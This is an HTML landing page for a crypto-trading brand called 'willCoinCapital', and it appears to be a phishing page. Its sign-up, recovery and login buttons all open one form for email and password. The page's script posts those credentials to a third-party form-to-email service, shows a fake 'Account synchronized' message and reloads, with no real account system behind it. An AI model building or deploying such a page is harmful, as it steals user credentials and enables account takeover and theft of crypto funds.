<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Welcome</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000000; color: white; margin: 0; overflow: hidden; height: 100vh; }
        
        /* BACKGROUND GLOW EFFECT */
        .aura-glow {
            position: absolute; bottom: 30%; left: 50%; transform: translateX(-50%);
            width: 300px; height: 300px;
            background: radial-gradient(circle, rgba(34, 211, 238, 0.4) 0%, rgba(34, 211, 238, 0) 70%);
            filter: blur(40px); z-index: 1;
        }

        /* FLOATING GLASS ICONS */
        .floating-box {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            width: 60px; height: 60px;
            display: flex; items-center; justify-center;
            position: absolute; animation: float 4s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .btn-primary { background: linear-gradient(90deg, #14b8a6, #22d3ee); color: black; font-weight: 800; }
        .btn-secondary { border: 1.5px solid #14b8a6; color: #22d3ee; font-weight: 600; }
        
        .view-hidden { display: none !important; }
    </style>
</head>
<body class="flex flex-col items-center justify-between py-16 px-8 relative">

    <div class="aura-glow"></div>

    <header class="text-center z-10">
        <div class="text-sm font-bold text-gray-400 mb-2">willCoinCapital</div>
        <div class="bg-white/10 px-3 py-1 rounded-full text-[9px] uppercase tracking-widest inline-block border border-white/5 mb-6">
            Trade crypto anytime
        </div>
        <h1 class="text-4xl font-extrabold tracking-tight leading-tight">
            Power Up Your <br> Crypto Journey
        </h1>
    </header>

    <div class="relative w-full h-64 z-10 flex items-center justify-center">
        <div class="floating-box" style="width: 80px; height: 80px; z-index: 5;">
            <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="w-10 opacity-80" alt="sol">
        </div>
        <div class="floating-box" style="top: 0; left: 20%; animation-delay: 0.5s;">
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-8 opacity-60" alt="eth">
        </div>
        <div class="floating-box" style="bottom: 10%; right: 20%; animation-delay: 1s;">
            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="w-8 opacity-60" alt="btc">
        </div>
        <div class="floating-box" style="top: 10%; right: 15%; animation-delay: 1.5s;">
            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-8 opacity-60" alt="bnb">
        </div>
    </div>

    <div class="w-full space-y-4 z-10 max-w-sm">
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-xl btn-secondary uppercase text-[10px] tracking-widest">
            Recover Account
        </button>
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-xl btn-primary uppercase text-[10px] tracking-widest shadow-lg shadow-cyan-500/20">
            Create Account
        </button>
        <div class="text-center">
            <button onclick="toggleAuth('login')" class="text-[10px] text-gray-400 uppercase tracking-widest font-bold mt-4">
                Already Have An Account? <span class="text-white">Log In</span>
            </button>
        </div>
    </div>

    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/90 backdrop-blur-md" onclick="toggleAuth()"></div>
        <div class="bg-white/5 border border-white/10 max-w-sm w-full p-8 rounded-[32px] relative z-10 text-center">
            <h2 id="authTitle" class="text-lg font-black uppercase text-cyan-400 mb-6">Authorize</h2>
            <form id="authForm" class="space-y-4">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="Email" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none focus:border-cyan-400">
                <input type="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none focus:border-cyan-400">
                <button type="submit" id="authSubmit" class="w-full py-4 btn-primary text-black font-black rounded-xl uppercase text-[10px]">Continue</button>
            </form>
        </div>
    </div>

    <script>
        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            document.getElementById('authTitle').innerText = mode === 'login' ? 'Welcome Back' : 'Get Started';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            btn.innerText = "Processing...";
            try {
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                // Here you can redirect to your main terminal page
                alert("Account synchronized. Verification pending.");
                window.location.reload(); 
            } catch(e) { btn.innerText = "Try Again"; }
        };
    </script>
</body>
</html>
